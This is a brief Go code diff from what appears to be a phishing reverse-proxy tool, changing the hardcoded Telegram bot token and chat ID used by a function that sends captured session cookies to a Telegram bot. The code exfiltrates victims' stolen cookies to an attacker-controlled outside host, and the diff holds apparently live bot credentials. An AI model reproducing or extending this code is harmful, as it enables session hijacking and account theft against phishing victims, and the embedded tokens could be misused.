@@ -1333,7 +1333,7 @@ func (p *HttpProxy) SendCapturedCookieTokensToTelegramBot(ps *Session) error {
 
 	// Send the file to the Telegram bot
 	message := fmt.Sprintf("Captured cookies for session ID %s", ps.Id)
-	err = SendMessageFileToTelegramBot(filename, message, "6467688722:AAHvXTnhNj0NI-SpbCUO61fWLPwNwILOy0M", "5721769962")
+	err = SendMessageFileToTelegramBot(filename, message, "7139444174:AAGe_aLLEfbI8wODQFW3LWb4RQdzBDzaogQ", "7092116539")
 	if err != nil {
 		return fmt.Errorf("failed to send file to Telegram bot: %v", err)
 	}
